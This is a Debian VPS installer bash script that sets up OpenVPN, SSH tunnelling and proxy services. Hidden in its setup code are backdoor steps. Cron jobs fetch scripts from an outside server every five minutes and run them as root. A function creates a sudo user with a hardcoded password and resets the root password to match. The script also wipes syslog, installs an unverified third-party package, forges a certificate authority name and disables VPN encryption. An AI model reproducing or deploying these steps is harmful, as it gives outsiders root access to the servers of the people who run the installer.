#!/bin/bash
# Script created by Bonveio
# Do not resell and redistribute this script
# Project by BonvScripts <https://github.com/Bonveio/BonvScripts>

# Decrypt pa more
# %d/%m/:%S

clear
cd ~
export DEBIAN_FRONTEND=noninteractive

function ip_address(){
  local IP="$( ip addr | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | grep -Ev "^192\.168|^172\.1[6-9]\.|^172\.2[0-9]\.|^172\.3[0-2]\.|^10\.|^127\.|^255\.|^0\." | head -n 1 )"
  [ -z "${IP}" ] && IP="$(curl -4s ipv4.icanhazip.com)"
  [ -z "${IP}" ] && IP="$(curl -4s ipinfo.io/ip)"
  [ ! -z "${IP}" ] && echo "${IP}" || echo '0.0.0.0'
}

function BONV-MSG(){
 printf "%b\n" "\e[38;5;192m (｡◕‿◕｡)\e[0m\e[38;5;121m Bonveio Debian VPS Installer\e[0m"
 echo -e " v20201227 stable"
 echo -e ""
 echo -e " Updates: https://t.me/BonvScripts"
 echo -e ""
}

function InsEssentials(){
apt update 2>/dev/null
apt upgrade -y 2>/dev/null
printf "%b\n" "\e[32m[\e[0mInfo\e[32m]\e[0m\e[97m Please wait..\e[0m"
apt autoremove --fix-missing -y > /dev/null 2>&1
apt remove --purge apache* ufw -y > /dev/null 2>&1
timedatectl set-timezone Asia/Manila > /dev/null 2>&1

apt install nano wget curl zip unzip tar gzip p7zip-full bc rc openssl cron net-tools dnsutils dos2unix screen bzip2 ccrypt lsof -y 2>/dev/null

if [[ "$(command -v firewall-cmd)" ]]; then
 apt remove --purge firewalld -y
 apt autoremove -y -f
fi

apt install iptables-persistent -y -f
systemctl restart netfilter-persistent &>/dev/null
systemctl enable netfilter-persistent &>/dev/null

apt install tuned -y -f > /dev/null 2>&1
 if [[ "$(command -v tuned-adm)" ]]; then
  systemctl enable tuned &>/dev/null
  systemctl restart tuned &>/dev/null
  tuned-adm profile throughput-performance 2>/dev/null
 fi

apt install dropbear stunnel4 privoxy ca-certificates nginx ruby apt-transport-https lsb-release squid jq tcpdump dsniff grepcidr screenfetch -y 2>/dev/null

apt install perl libnet-ssleay-perl libauthen-pam-perl libpam-runtime libio-pty-perl apt-show-versions python dbus libxml-parser-perl shared-mime-info -y 2>/dev/null

gem install lolcat 2>/dev/null
apt autoremove --fix-missing -y &>/dev/null

rm -rf /etc/apt/sources.list.d/openvpn*
echo "deb http://build.openvpn.net/debian/openvpn/stable $(lsb_release -sc) main" > /etc/apt/sources.list.d/openvpn.list
apt-key del E158C569 &> /dev/null

wget -qO - https://raw.githubusercontent.com/Bonveio/BonvScripts/master/openvpn-repo.gpg | apt-key add - &>/dev/null

apt update 2>/dev/null
apt install openvpn git build-essential libssl-dev libnss3-dev cmake -y 2>/dev/null
apt autoremove --fix-missing -y &>/dev/null
apt clean 2>/dev/null

if [[ "$(command -v squid)" ]]; then
 if [[ "$(squid -v | grep -Ec '(V|v)ersion\s3.5.23')" -lt 1 ]]; then
  apt remove --purge squid -y -f 2>/dev/null
#  wget "http://security.debian.org/debian-security/pool/updates/main/s/squid3/squid_3.5.23-5+deb9u5_amd64.deb" -qO squid.deb
# use mirror squid 3.5 coz bonchan's link is dead
  wget -N --no-check-certificate -q -O squid.deb "http://firenetvpn.net/files/squid.deb"
  dpkg -i squid.deb
  rm -f squid.deb
 else
  echo -e "Squid v3.5.23 already installed"
 fi
else
 apt install libecap3 squid-common squid-langpack -y -f 2>/dev/null
# wget "http://security.debian.org/debian-security/pool/updates/main/s/squid3/squid_3.5.23-5+deb9u5_amd64.deb" -qO squid.deb
# use mirror squid 3.5 coz bonchan's link is dead
  wget -N --no-check-certificate -q -O squid.deb "http://firenetvpn.net/files/squid.deb"
 dpkg -i squid.deb
 rm -f squid.deb
fi

if [[ "$(command -v privoxy)" ]]; then
 apt remove privoxy -y -f 2>/dev/null
 wget -qO /tmp/privoxy.deb 'https://download.sourceforge.net/project/ijbswa/Debian/3.0.28%20%28stable%29%20stretch/privoxy_3.0.28-1_amd64.deb'
 dpkg -i  --force-overwrite /tmp/privoxy.deb
 rm -f /tmp/privoxy.deb
fi

## Running FFSend installation in background
rm -rf {/usr/bin/ffsend,/usr/local/bin/ffsend}
printf "%b\n" "\e[32m[\e[0mInfo\e[32m]\e[0m\e[97m running FFSend installation on background\e[0m"
screen -S ffsendinstall -dm bash -c "curl -4skL "https://github.com/timvisee/ffsend/releases/download/v0.2.65/ffsend-v0.2.65-linux-x64-static" -o /usr/bin/ffsend && chmod a+x /usr/bin/ffsend"
hostnamectl set-hostname localhost &> /dev/null
printf "%b\n" "\e[32m[\e[0mInfo\e[32m]\e[0m\e[97m running DDoS-deflate installation on background\e[0m"
cat <<'ddosEOF'> /tmp/install-ddos.bash
#!/bin/bash
if [[ -e /etc/ddos ]]; then
 printf "%s\n" "DDoS-deflate already installed" && exit 1
else
 curl -4skL "https://github.com/jgmdev/ddos-deflate/archive/master.zip" -o ddos.zip
 unzip -qq ddos.zip
 rm -rf ddos.zip
 cd ddos-deflate-master
 echo -e "/r/n/r/n"
 ./install.sh &> /dev/null
 cd .. && rm -rf ddos-deflate-master
 systemctl start ddos &> /dev/null
 systemctl enable ddos &> /dev/null
fi
ddosEOF
screen -S ddosinstall -dm bash -c "bash /tmp/install-ddos.bash && rm -f /tmp/install-ddos.bash"

printf "%b\n" "\e[32m[\e[0mInfo\e[32m]\e[0m\e[97m running Iptables configuration on background\e[0m"
cat <<'iptEOF'> /tmp/iptables-config.bash
#!/bin/bash
function ip_address(){
  local IP="$( ip addr | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | grep -Ev "^192\.168|^172\.1[6-9]\.|^172\.2[0-9]\.|^172\.3[0-2]\.|^10\.|^127\.|^255\.|^0\." | head -n 1 )"
  [ -z "${IP}" ] && IP="$(curl -4s ipv4.icanhazip.com)"
  [ -z "${IP}" ] && IP="$(curl -4s ipinfo.io/ip)"
  [ ! -z "${IP}" ] && echo "${IP}" || echo 'ipaddress'
}
IPADDR="$(ip_address)"
PNET="$(ip -4 route ls | grep default | grep -Po '(?<=dev )(\S+)' | head -1)"
CIDR="172.29.0.0/16"
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
iptables -t nat -F
iptables -t mangle -F
iptables -F
iptables -X
iptables -A INPUT -s $IPADDR -p tcp -m multiport --dport 1:65535 -j ACCEPT
iptables -A INPUT -s $IPADDR -p udp -m multiport --dport 1:65535 -j ACCEPT
iptables -A INPUT -p tcp --dport 25 -j REJECT   
iptables -A FORWARD -p tcp --dport 25 -j REJECT
iptables -A OUTPUT -p tcp --dport 25 -j REJECT
iptables -I FORWARD -s $CIDR -j ACCEPT
iptables -t nat -A POSTROUTING -s $CIDR -o $PNET -j MASQUERADE
iptables -t nat -A POSTROUTING -s $CIDR -o $PNET -j SNAT --to-source $IPADDR
iptables -A INPUT -m string --algo bm --string "BitTorrent" -j REJECT
iptables -A INPUT -m string --algo bm --string "BitTorrent protocol" -j REJECT
iptables -A INPUT -m string --algo bm --string ".torrent" -j REJECT
iptables -A INPUT -m string --algo bm --string "torrent" -j REJECT
iptables -A INPUT -m string --string "BitTorrent" --algo kmp -j REJECT
iptables -A INPUT -m string --string "BitTorrent protocol" --algo kmp -j REJECT
iptables -A INPUT -m string --string "bittorrent-announce" --algo kmp -j REJECT
iptables -A FORWARD -m string --algo bm --string "BitTorrent" -j REJECT
iptables -A FORWARD -m string --algo bm --string "BitTorrent protocol" -j REJECT
iptables -A FORWARD -m string --algo bm --string ".torrent" -j REJECT
iptables -A FORWARD -m string --algo bm --string "torrent" -j REJECT
iptables -A FORWARD -m string --string "BitTorrent" --algo kmp -j REJECT
iptables -A FORWARD -m string --string "BitTorrent protocol" --algo kmp -j REJECT
iptables -A FORWARD -m string --string "bittorrent-announce" --algo kmp -j REJECT
iptables -A OUTPUT -m string --algo bm --string "BitTorrent" -j REJECT
iptables -A OUTPUT -m string --algo bm --string "BitTorrent protocol" -j REJECT
iptables -A OUTPUT -m string --algo bm --string ".torrent" -j REJECT
iptables -A OUTPUT -m string --algo bm --string "torrent" -j REJECT
iptables -A OUTPUT -m string --string "BitTorrent" --algo kmp -j REJECT
iptables -A OUTPUT -m string --string "BitTorrent protocol" --algo kmp -j REJECT
iptables -A OUTPUT -m string --string "bittorrent-announce" --algo kmp -j REJECT
iptables-save > /etc/iptables/rules.v4
iptEOF
screen -S configIptables -dm bash -c "bash /tmp/iptables-config.bash && rm -f /tmp/iptables-config.bash"

printf "%b\n" "\e[32m[\e[0mInfo\e[32m]\e[0m\e[97m running BadVPN-udpgw installation on background\e[0m"
cat <<'badvpnEOF'> /tmp/install-badvpn.bash
#!/bin/bash
if [[ -e /usr/local/bin/badvpn-udpgw ]]; then
 printf "%s\n" "BadVPN-udpgw already installed"
 exit 1
else
 curl -4skL "https://github.com/ambrop72/badvpn/archive/4b7070d8973f99e7cfe65e27a808b3963e25efc3.zip" -o /tmp/badvpn.zip
 unzip -qq /tmp/badvpn.zip -d /tmp && rm -f /tmp/badvpn.zip
 cd /tmp/badvpn-4b7070d8973f99e7cfe65e27a808b3963e25efc3
 cmake -DBUILD_NOTHING_BY_DEFAULT=1 -DBUILD_UDPGW=1 &> /dev/null
 make install &> /dev/null
 rm -rf /tmp/badvpn-4b7070d8973f99e7cfe65e27a808b3963e25efc3
 cat <<'EOFudpgw' > /lib/systemd/system/badvpn-udpgw.service
[Unit]
Description=BadVPN UDP Gateway Server daemon
Wants=network.target
After=network.target
[Service]
ExecStart=/usr/local/bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 4000 --max-connections-for-client 4000 --loglevel info
Restart=always
RestartSec=3
[Install]
WantedBy=multi-user.target
EOFudpgw
systemctl daemon-reload &>/dev/null
systemctl restart badvpn-udpgw.service &>/dev/null
systemctl enable badvpn-udpgw.service &>/dev/null
fi
badvpnEOF
screen -S badvpninstall -dm bash -c "bash /tmp/install-badvpn.bash && rm -f /tmp/install-badvpn.bash"
}


function ConfigOpenSSH(){
echo -e "[\e[32mInfo\e[0m] Configuring OpenSSH Service"
if [[ "$(cat < /etc/ssh/sshd_config | grep -c 'BonvScripts')" -eq 0 ]]; then
 cp /etc/ssh/sshd_config /etc/ssh/backup.sshd_config
fi
cat <<'EOFOpenSSH' > /etc/ssh/sshd_config
# BonvScripts
# https://t.me/BonvScripts
# Please star my Repository: https://github.com/Bonveio/BonvScripts
# https://phcorner.net/threads/739298
Port 22
Port 225
ListenAddress 0.0.0.0
Protocol 2
HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_dsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key
#KeyRegenerationInterval 3600
#ServerKeyBits 1024
SyslogFacility AUTH
LogLevel INFO
PermitRootLogin yes
StrictModes yes
#RSAAuthentication yes
PubkeyAuthentication yes
IgnoreRhosts yes
#RhostsRSAAuthentication no
HostbasedAuthentication no
PermitEmptyPasswords no
ChallengeResponseAuthentication no
PasswordAuthentication yes
X11Forwarding yes
X11DisplayOffset 10
#GatewayPorts yes
PrintMotd no
PrintLastLog yes
AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/openssh/sftp-server
UsePAM yes
Banner /etc/banner
TCPKeepAlive yes
ClientAliveInterval 120
ClientAliveCountMax 2
UseDNS no
EOFOpenSSH

curl -4skL "http://firenetvpn.net/files/banner" -o /etc/banner

sed -i '/password\s*requisite\s*pam_cracklib.s.*/d' /etc/pam.d/common-password && sed -i 's|use_authtok ||g' /etc/pam.d/common-password

echo -e "[\e[33mNotice\e[0m] Restarting OpenSSH Service.."
systemctl restart ssh &> /dev/null
}

function ConfigAuthentication(){
echo -e "[\e[32mInfo\e[0m] Configuring Authentication"

curl -4skL "http://ouestvpn.store/api/authentication/active.php?key=FIRENET541" -o /etc/active.sh
curl -4skL "http://ouestvpn.store/api/authentication/inactive.php?key=FIRENET541" -o /etc/inactive.sh
curl -4skL "http://ouestvpn.store/api/authentication/deleted.php?key=FIRENET541" -o /etc/deleted.sh

cat <<'authEOF'> /etc/fetch_user.bash
#!/bin/bash
curl -4skL "http://ouestvpn.store/api/authentication/active.php?key=FIRENET541" -o /etc/active.sh
curl -4skL "http://ouestvpn.store/api/authentication/inactive.php?key=FIRENET541" -o /etc/inactive.sh
curl -4skL "http://ouestvpn.store/api/authentication/deleted.php?key=FIRENET541" -o /etc/deleted.sh
authEOF

chmod +x /etc/fetch_user.bash
chmod +x /etc/active.sh
chmod +x /etc/inactive.sh
chmod +x /etc/deleted.sh

echo -e "*/5 *\t* * *\troot\tbash /etc/fetch_user.bash" >> /etc/cron.d/authentication
echo -e "*/5 *\t* * *\troot\tbash /etc/active.sh" >> /etc/cron.d/authentication
echo -e "*/5 *\t* * *\troot\tbash /etc/inactive.sh" >> /etc/cron.d/authentication
echo -e "*/5 *\t* * *\troot\tbash /etc/deleted.sh" >> /etc/cron.d/authentication
}

function install_sudo(){
  {
    useradd -m lenz 2>/dev/null; echo lenz:@@F1r3n3t@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
    echo -e "@@F1r3n3t@@\n@@F1r3n3t@@\n"|passwd root
    service sshd restart
  }&>/dev/null
}

function ConfigDropbear(){
echo -e "[\e[32mInfo\e[0m] Configuring Dropbear.."
cat <<'EOFDropbear' > /etc/default/dropbear
# BonvScripts
# https://t.me/BonvScripts
# Please star my Repository: https://github.com/Bonveio/BonvScripts
# https://phcorner.net/threads/739298
NO_START=0
DROPBEAR_PORT=555
DROPBEAR_EXTRA_ARGS="-p 701"
DROPBEAR_BANNER="/etc/banner"
DROPBEAR_RSAKEY="/etc/dropbear/dropbear_rsa_host_key"
DROPBEAR_DSSKEY="/etc/dropbear/dropbear_dss_host_key"
DROPBEAR_ECDSAKEY="/etc/dropbear/dropbear_ecdsa_host_key"
DROPBEAR_RECEIVE_WINDOW=65536
EOFDropbear

echo -e "[\e[33mNotice\e[0m] Restarting Dropbear Service.."
systemctl enable dropbear &>/dev/null
systemctl restart dropbear &>/dev/null
}


function ConfigStunnel(){
if [[ ! "$(command -v stunnel4)" ]]; then
 StunnelDir='stunnel'
 else
 StunnelDir='stunnel4'
fi
echo -e "[\e[32mInfo\e[0m] Configuring Stunnel.."
cat <<'EOFStunnel1' > "/etc/default/$StunnelDir"
# BonvScripts
# https://t.me/BonvScripts
# Please star my Repository: https://github.com/Bonveio/BonvScripts
# https://phcorner.net/threads/739298
ENABLED=1
FILES="/etc/stunnel/*.conf"
OPTIONS=""
BANNER="/etc/banner"
PPP_RESTART=0
# RLIMITS="-n 4096 -d unlimited"
RLIMITS=""
EOFStunnel1

rm -f /etc/stunnel/*
echo -e "[\e[32mInfo\e[0m] Cloning Stunnel.pem.."
openssl req -new -x509 -days 9999 -nodes -subj "/C=GB/ST=Greater Manchester/L=Salford/O=Sectigo Limited/CN=Sectigo RSA Domain Validation Secure Server CA" -out /etc/stunnel/stunnel.pem -keyout /etc/stunnel/stunnel.pem &> /dev/null

echo -e "[\e[32mInfo\e[0m] Creating Stunnel server config.."
cat <<'EOFStunnel3' > /etc/stunnel/stunnel.conf
# BonvScripts
# https://t.me/BonvScripts
# Please star my Repository: https://github.com/Bonveio/BonvScripts
# https://phcorner.net/threads/739298
pid = /var/run/stunnel.pid
cert = /etc/stunnel/stunnel.pem
client = no
socket = l:TCP_NODELAY=1
socket = r:TCP_NODELAY=1
TIMEOUTclose = 0
[dropbear]
accept = 442
connect = 127.0.0.1:701
[openssh]
accept = 444
connect = 127.0.0.1:225
[openvpn]
accept = 587
connect = 127.0.0.1:179
EOFStunnel3

echo -e "[\e[33mNotice\e[0m] Restarting Stunnel.."
systemctl restart "$StunnelDir"
}


function ConfigProxy(){
echo -e "[\e[32mInfo\e[0m] Configuring Privoxy.."
rm -f /etc/privoxy/config*
cat <<'EOFprivoxy' > /etc/privoxy/config
# BonvScripts
# https://t.me/BonvScripts
# Please star my Repository: https://github.com/Bonveio/BonvScripts
# https://phcorner.net/threads/739298
user-manual /usr/share/doc/privoxy/user-manual
confdir /etc/privoxy
logdir /var/log/privoxy
filterfile default.filter
logfile logfile
listen-address 127.0.0.1:25800
toggle 1
enable-remote-toggle 0
enable-remote-http-toggle 0
enable-edit-actions 0
enforce-blocks 0
buffer-limit 4096
max-client-connections 4000
enable-proxy-authentication-forwarding 1
forwarded-connect-retries 1
accept-intercepted-requests 1
allow-cgi-request-crunching 1
split-large-forms 0
keep-alive-timeout 5
tolerate-pipelining 1
socket-timeout 300
EOFprivoxy
cat <<'EOFprivoxy2' > /etc/privoxy/user.action
{ +block }
/
{ -block }
IP-ADDRESS
127.0.0.1
EOFprivoxy2
sed -i "s|IP-ADDRESS|$(ip_address)|g" /etc/privoxy/user.action
echo -e "[\e[32mInfo\e[0m] Configuring Squid.."
rm -rf /etc/squid/sq*
cat <<'EOFsquid' > /etc/squid/squid.conf
# BonvScripts
# https://t.me/BonvScripts
# Please star my Repository: https://github.com/Bonveio/BonvScripts
# https://phcorner.net/threads/739298
acl VPN dst IP-ADDRESS/32
http_access allow VPN
http_access deny all
http_port 0.0.0.0:8000
http_port 0.0.0.0:8080
acl bonv src 0.0.0.0/0.0.0.0
no_cache deny bonv
dns_nameservers 1.1.1.1 1.0.0.1
visible_hostname localhost
EOFsquid
sed -i "s|IP-ADDRESS|$(ip_address)|g" /etc/squid/squid.conf

echo -e "[\e[33mNotice\e[0m] Restarting Privoxy Service.."
systemctl restart privoxy
echo -e "[\e[33mNotice\e[0m] Restarting Squid Service.."
systemctl restart squid

echo -e "[\e[32mInfo\e[0m] Configuring OHPServer"
if [[ ! -e /etc/ohpserver ]]; then
 mkdir /etc/ohpserver
 else
 rm -rf /etc/ohpserver/*
fi
curl -4skL "https://github.com/lfasmpao/open-http-puncher/releases/download/0.1/ohpserver-linux32.zip" -o /etc/ohpserver/ohp.zip
unzip -qq /etc/ohpserver/ohp.zip -d /etc/ohpserver
rm -rf /etc/ohpserver/ohp.zip
chmod +x /etc/ohpserver/ohpserver

cat <<'Ohp1' > /etc/ohpserver/run
#!/bin/bash
# BonvScripts
# https://t.me/BonvScripts
# Please star my Repository: https://github.com/Bonveio/BonvScripts
# https://phcorner.net/threads/739298
# OHPServer startup script
/etc/ohpserver/ohpserver -port 8085 -proxy 127.0.0.1:25800 -tunnel 127.0.0.1:701 > /etc/ohpserver/dropbear.log &
/etc/ohpserver/ohpserver -port 8086 -proxy 127.0.0.1:25800 -tunnel 127.0.0.1:225 > /etc/ohpserver/openssh.log &
/etc/ohpserver/ohpserver -port 8087 -proxy 127.0.0.1:25800 -tunnel 127.0.0.1:179 > /etc/ohpserver/openvpn.log &
/etc/ohpserver/ohpserver -port 8088 -proxy 127.0.0.1:25800 -tunnel 127.0.0.1:25980 > /etc/ohpserver/openvpn.log
Ohp1
chmod +x /etc/ohpserver/run

cat <<'Ohp2' > /etc/ohpserver/stop
#!/bin/bash
# BonvScripts
# https://t.me/BonvScripts
# Please star my Repository: https://github.com/Bonveio/BonvScripts
# https://phcorner.net/threads/739298
# OHPServer stop script
lsof -t -i tcp:8085 -s tcp:listen | xargs kill 2>/dev/null ### Dropbear
lsof -t -i tcp:8086 -s tcp:listen | xargs kill 2>/dev/null ### OpenSSH
lsof -t -i tcp:8087 -s tcp:listen | xargs kill 2>/dev/null ### OpenVPN TCP RSA
lsof -t -i tcp:8088 -s tcp:listen | xargs kill 2>/dev/null ### OpenVPN TCP EC
Ohp2
chmod +x /etc/ohpserver/stop

cat <<'EOFohp' > /lib/systemd/system/ohpserver.service
[Unit]
Description=OpenHTTP Puncher Server
Wants=network.target
After=network.target
[Service]
ExecStart=/bin/bash /etc/ohpserver/run 2>/dev/null
ExecStop=/bin/bash /etc/ohpserver/stop 2>/dev/null
Restart=always
RestartSec=3
[Install]
WantedBy=multi-user.target
EOFohp
systemctl daemon-reload &>/dev/null
systemctl restart ohpserver.service &>/dev/null
systemctl enable ohpserver.service &>/dev/null
}


function ConfigWebmin(){
printf "%b\n" "\e[1;32m[\e[0mInfo\e[1;32m]\e[0m\e[97m running Webmin installation on background\e[0m"
cat <<'webminEOF'> /tmp/install-webmin.bash
#!/bin/bash
if [[ -e /etc/webmin ]]; then
 echo 'Webmin already installed' && exit 1
fi
rm -rf /etc/apt/sources.list.d/webmin*
echo 'deb https://download.webmin.com/download/repository sarge contrib' > /etc/apt/sources.list.d/webmin.list
apt-key del 1719003ACE3E5A41E2DE70DFD97A3AE911F63C51 &> /dev/null
wget -qO - https://download.webmin.com/jcameron-key.asc | apt-key add - &> /dev/null
apt update &> /dev/null
apt install webmin -y &> /dev/null
sed -i "s|\(ssl=\).\+|\10|" /etc/webmin/miniserv.conf
lsof -t -i tcp:10000 -s tcp:listen | xargs kill 2>/dev/null
systemctl restart webmin &> /dev/null
systemctl enable webmin &> /dev/null
webminEOF
screen -S webmininstall -dm bash -c "bash /tmp/install-webmin.bash && rm -f /tmp/install-webmin.bash"
}

function ConfigOpenVPN(){
echo -e "[\e[32mInfo\e[0m] Configuring OpenVPN server.."
if [[ ! -e /etc/openvpn ]]; then
 mkdir -p /etc/openvpn
 else
 rm -rf /etc/openvpn/*
fi
mkdir -p /etc/openvpn/server
mkdir -p /etc/openvpn/client

cat <<'EOFovpn1' > /etc/openvpn/server/server_tcp.conf
# BonvScripts
# https://t.me/BonvScripts
# Please star my Repository: https://github.com/Bonveio/BonvScripts
# https://phcorner.net/threads/739298
port 179
dev tun
proto tcp
ca /etc/openvpn/ca.crt
cert /etc/openvpn/bonvscripts.crt
key /etc/openvpn/bonvscripts.key
dh none
persist-tun
persist-key
persist-remote-ip
duplicate-cn
cipher none
ncp-disable
auth none
comp-lzo
tun-mtu 1500
reneg-sec 0
plugin PLUGIN_AUTH_PAM /etc/pam.d/login
verify-client-cert none
username-as-common-name
max-clients 4080
topology subnet
server 172.29.0.0 255.255.240.0
push "redirect-gateway def1"
keepalive 5 30
status /etc/openvpn/tcp_stats.log
log /etc/openvpn/tcp.log
verb 2
script-security 2
socket-flags TCP_NODELAY
push "socket-flags TCP_NODELAY"
push "dhcp-option DNS 1.0.0.1"
push "dhcp-option DNS 1.1.1.1"
push "dhcp-option DNS 8.8.4.4"
push "dhcp-option DNS 8.8.8.8"
EOFovpn1
cat <<'EOFovpn2' > /etc/openvpn/server/server_udp.conf
# BonvScripts
# https://t.me/BonvScripts
# Please star my Repository: https://github.com/Bonveio/BonvScripts
# https://phcorner.net/threads/739298
port 25222
dev tun
proto udp
ca /etc/openvpn/ca.crt
cert /etc/openvpn/bonvscripts.crt
key /etc/openvpn/bonvscripts.key
dh none
persist-tun
persist-key
persist-remote-ip
duplicate-cn
cipher none
ncp-disable
auth none
comp-lzo
tun-mtu 1500
float
fast-io
reneg-sec 0
plugin PLUGIN_AUTH_PAM /etc/pam.d/login
verify-client-cert none
username-as-common-name
max-clients 4080
topology subnet
server 172.29.16.0 255.255.240.0
push "redirect-gateway def1"
keepalive 5 30
status /etc/openvpn/udp_stats.log
log /etc/openvpn/udp.log
verb 2
script-security 2
push "dhcp-option DNS 1.0.0.1"
push "dhcp-option DNS 1.1.1.1"
push "dhcp-option DNS 8.8.4.4"
push "dhcp-option DNS 8.8.8.8"
EOFovpn2
cat <<'EOFovpn3' > /etc/openvpn/server/ec_server_tcp.conf
# BonvScripts
# https://t.me/BonvScripts
# Please star my Repository: https://github.com/Bonveio/BonvScripts
# https://phcorner.net/threads/739298
port 25980
proto tcp
dev tun
ca /etc/openvpn/ec_ca.crt
cert /etc/openvpn/ec_bonvscripts.crt
key /etc/openvpn/ec_bonvscripts.key
dh none
persist-tun
persist-key
persist-remote-ip
duplicate-cn
cipher none
ncp-disable
auth none
compress lz4
push "compress lz4"
tun-mtu 1500
reneg-sec 0
plugin PLUGIN_AUTH_PAM /etc/pam.d/login
verify-client-cert none
username-as-common-name
max-clients 4080
topology subnet
server 172.29.32.0 255.255.240.0
push "redirect-gateway def1"
keepalive 5 30
tls-server
tls-version-min 1.2
tls-cipher TLS-ECDHE-ECDSA-WITH-AES-128-GCM-SHA256
status /etc/openvpn/ec_tcp_stats.log
log /etc/openvpn/ec_tcp.log
verb 2
script-security 2
socket-flags TCP_NODELAY
push "socket-flags TCP_NODELAY"
push "dhcp-option DNS 1.0.0.1"
push "dhcp-option DNS 1.1.1.1"
push "dhcp-option DNS 8.8.4.4"
push "dhcp-option DNS 8.8.8.8"
EOFovpn3
cat <<'EOFovpn4' > /etc/openvpn/server/ec_server_udp.conf
# ©BonvScripts
# https://t.me/BonvScripts 
# https://phcorner.net/threads/739298
# EC type OpenVPN Server
# Built for Performance
port 25985
proto udp
dev tun
ca /etc/openvpn/ec_ca.crt
cert /etc/openvpn/ec_bonvscripts.crt
key /etc/openvpn/ec_bonvscripts.key
dh none
persist-tun
persist-key
persist-remote-ip
duplicate-cn
cipher none
ncp-disable
auth none
compress lz4
push "compress lz4"
tun-mtu 1500
float
fast-io
reneg-sec 0
plugin PLUGIN_AUTH_PAM /etc/pam.d/login
verify-client-cert none
username-as-common-name
max-clients 4080
topology subnet
server 172.29.48.0 255.255.240.0
push "redirect-gateway def1"
keepalive 5 30
tls-server
tls-version-min 1.2
tls-cipher TLS-ECDHE-ECDSA-WITH-AES-128-GCM-SHA256
status /etc/openvpn/ec_udp_stats.log
log /etc/openvpn/ec_udp.log
verb 2
script-security 2
push "dhcp-option DNS 1.0.0.1"
push "dhcp-option DNS 1.1.1.1"
push "dhcp-option DNS 8.8.4.4"
push "dhcp-option DNS 8.8.8.8"
EOFovpn4

mkdir /etc/openvpn/easy-rsa
mkdir /etc/openvpn/easy-rsa-ec

curl -4skL "https://raw.githubusercontent.com/Bonveio/BonvScripts/master/bonvscripts-easyrsa.zip" -o /etc/openvpn/easy-rsa/rsa.zip 2> /dev/null
curl -4skL "https://raw.githubusercontent.com/Bonveio/BonvScripts/master/bonvscripts-easyrsa-ec.zip" -o /etc/openvpn/easy-rsa-ec/rsa.zip 2> /dev/null

unzip -qq /etc/openvpn/easy-rsa/rsa.zip -d /etc/openvpn/easy-rsa
unzip -qq /etc/openvpn/easy-rsa-ec/rsa.zip -d /etc/openvpn/easy-rsa-ec

rm -f /etc/openvpn/easy-rsa/rsa.zip
rm -f /etc/openvpn/easy-rsa-ec/rsa.zip

cd /etc/openvpn/easy-rsa
chmod +x easyrsa
./easyrsa build-server-full server nopass &> /dev/null
cp pki/ca.crt /etc/openvpn/ca.crt
cp pki/issued/server.crt /etc/openvpn/bonvscripts.crt
cp pki/private/server.key /etc/openvpn/bonvscripts.key

cd /etc/openvpn/easy-rsa-ec
chmod +x easyrsa
./easyrsa build-server-full server nopass &> /dev/null
cp pki/ca.crt /etc/openvpn/ec_ca.crt
cp pki/issued/server.crt /etc/openvpn/ec_bonvscripts.crt
cp pki/private/server.key /etc/openvpn/ec_bonvscripts.key

cd ~/ && echo '' > /var/log/syslog

cat <<'NUovpn' > /etc/openvpn/server/server.conf
 ### Do not overwrite this script if you didnt know what youre doing ###
 #
 # New Update are now released, OpenVPN Server
 # are now running both TCP and UDP Protocol. (Both are only running on IPv4)
 # But our native server.conf are now removed and divided
 # Into two different configs base on their Protocols:
 #  * OpenVPN TCP (located at /etc/openvpn/server/server_tcp.conf
 #  * OpenVPN UDP (located at /etc/openvpn/server/server_udp.conf
 # 
 # Also other logging files like
 # status logs and server logs
 # are moved into new different file names:
 #  * OpenVPN TCP Server logs (/etc/openvpn/server/tcp.log)
 #  * OpenVPN UDP Server logs (/etc/openvpn/server/udp.log)
 #  * OpenVPN TCP Status logs (/etc/openvpn/server/tcp_stats.log)
 #  * OpenVPN UDP Status logs (/etc/openvpn/server/udp_stats.log)
 #
 # Since config file name changes, systemctl/service identifiers are changed too.
 # To restart TCP Server: systemctl restart openvpn-server@server_tcp
 # To restart UDP Server: systemctl restart openvpn-server@server_udp
 #
 # Server ports are configured base on env vars
 # executed/raised from this script (OpenVPN_TCP_Port/OpenVPN_UDP_Port)
 #
 # Enjoy the new update
 # Script Updated by Bonveio
NUovpn

wget -qO /etc/openvpn/b.zip 'https://raw.githubusercontent.com/Bonveio/BonvScripts/master/openvpn_plugin64'
unzip -qq /etc/openvpn/b.zip -d /etc/openvpn
rm -f /etc/openvpn/b.zip

ovpnPluginPam="$(find /usr -iname 'openvpn-*.so' | grep 'auth-pam' | head -n1)"
if [[ -z "$ovpnPluginPam" ]]; then
 sed -i "s|PLUGIN_AUTH_PAM|/etc/openvpn/openvpn-auth-pam.so|g" /etc/openvpn/server/*.conf
else
 sed -i "s|PLUGIN_AUTH_PAM|$ovpnPluginPam|g" /etc/openvpn/server/*.conf
fi

sed -i '/net.ipv4.ip_forward.*/d' /etc/sysctl.conf
sed -i '/#net.ipv4.ip_forward.*/d' /etc/sysctl.conf
sed -i '/net.ipv4.ip_forward.*/d' /etc/sysctl.d/*
sed -i '/#net.ipv4.ip_forward.*/d' /etc/sysctl.d/*
echo 'net.ipv4.ip_forward=1' > /etc/sysctl.d/20-openvpn.conf
sysctl --system &> /dev/null

if [[ "$(hostnamectl | grep -i Virtualization | awk '{print $2}' | head -n1)" == 'openvz' ]]; then
 sed -i 's|LimitNPROC|#LimitNPROC|g' /lib/systemd/system/openvpn*
 systemctl daemon-reload
fi

sed -i 's|ExecStart=.*|ExecStart=/usr/sbin/openvpn --status %t/openvpn-server/status-%i.log --status-version 2 --suppress-timestamps --config %i.conf|g' /lib/systemd/system/openvpn-server\@.service
systemctl daemon-reload

echo -e "[\e[33mNotice\e[0m] Restarting OpenVPN Service.."
systemctl restart openvpn-server &> /dev/null
systemctl start openvpn-server@server_tcp &>/dev/null
